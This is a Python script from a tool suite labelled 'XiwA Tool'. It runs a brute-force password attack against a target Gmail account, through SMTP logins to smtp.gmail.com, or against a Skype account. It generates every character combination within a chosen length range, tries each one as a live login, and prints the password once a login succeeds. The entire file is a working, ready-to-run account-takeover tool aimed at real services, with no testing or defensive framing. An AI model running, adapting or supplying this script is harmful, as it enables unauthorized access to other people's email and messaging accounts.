"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""


import os
import time
import smtplib
import itertools
import string
from skpy import Skype
from colorama import Fore, Style
from tqdm import tqdm
import shutil

red = Fore.RED
white = Fore.WHITE
reset = Style.RESET_ALL

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"""{red}
██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝{reset}
""")

def generate_passwords(min_length, max_length):
    chars = string.ascii_letters + string.digits + string.punctuation
    for length in range(min_length, max_length + 1):
        for guess in itertools.product(chars, repeat=length):
            yield ''.join(guess)

def try_gmail(email, password):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.quit()
        return True
    except:
        return False

def try_skype(username, password):
    try:
        sk = Skype(username, password)
        return True
    except:
        return False

def display_progress(attempts, elapsed_time, current_pass, target, terminal_width):
    left_width = terminal_width // 2
    
    print(f"{red}╔{'═' * (left_width-2)}╗")
    print(f"║{white} Dernières tentatives:{' ' * (left_width-21)}{red}║")
    for i in range(max(0, attempts-5), attempts):
        pass_tried = current_pass
        print(f"║{white} {pass_tried}{' ' * (left_width-len(pass_tried)-2)}{red}║")
    print(f"╚{'═' * (left_width-2)}╝")

    print(f"{red}{'═' * (terminal_width-left_width)}", end='')
    print(f"\n{white}Cible: {target}")
    print(f"Tentatives: {attempts}")
    print(f"Temps écoulé: {elapsed_time:.2f}s")
    print(f"Mot de passe actuel: {current_pass}")
    
    progress = (attempts / 100000) * 100
    bar_width = terminal_width - left_width - 10
    filled = int(bar_width * progress // 100)
    bar = f"{red}█{reset}" * filled + f"{white}█{reset}" * (bar_width - filled)
    print(f"\nProgression: [{bar}] {progress:.1f}%")

def main():
    clear()
    banner()
    
    print(f"\n{red}[{white}1{red}]{white} Gmail")
    print(f"{red}[{white}2{red}]{white} Skype")
    
    while True:
        choice = input(f"\n{red}[{white}>{red}]{white} Choix (1-2): ").strip()
        if choice in ['1', '2']:
            break
        print(f"{red}[{white}!{red}]{white} Choix invalide!")

    if choice == '1':
        target = input(f"\n{red}[{white}>{red}]{white} Email Gmail cible: ").strip()
        if not target.endswith('@gmail.com'):
            print(f"{red}[{white}!{red}]{white} L'email doit être un Gmail!")
            return
    else:
        target = input(f"\n{red}[{white}>{red}]{white} Nom d'utilisateur Skype: ").strip()

    min_len = int(input(f"{red}[{white}>{red}]{white} Longueur minimum du mot de passe: ").strip())
    max_len = int(input(f"{red}[{white}>{red}]{white} Longueur maximum du mot de passe: ").strip())

    if min_len > max_len:
        print(f"{red}[{white}!{red}]{white} La longueur minimum doit être inférieure à la longueur maximum!")
        return

    print(f"\n{red}[{white}*{red}]{white} Démarrage du Brute Force...\n")
    
    start_time = time.time()
    attempts = 0
    terminal_width = shutil.get_terminal_size().columns
    
    for password in generate_passwords(min_len, max_len):
        attempts += 1
        
        clear()
        display_progress(attempts, time.time() - start_time, password, target, terminal_width)
        
        success = try_gmail(target, password) if choice == '1' else try_skype(target, password)
        
        if success:
            print(f"\n{red}[{white}+{red}]{white} Mot de passe trouvé!")
            print(f"{red}[{white}*{red}]{white} Identifiant: {target}")
            print(f"{red}[{white}*{red}]{white} Mot de passe: {password}")
            return
            
        if attempts >= 100000:  # Limite à 100k tentatives
            print(f"\n{red}[{white}!{red}]{white} Aucun mot de passe trouvé après {attempts} tentatives.")
            break

if __name__ == "__main__":
    main()
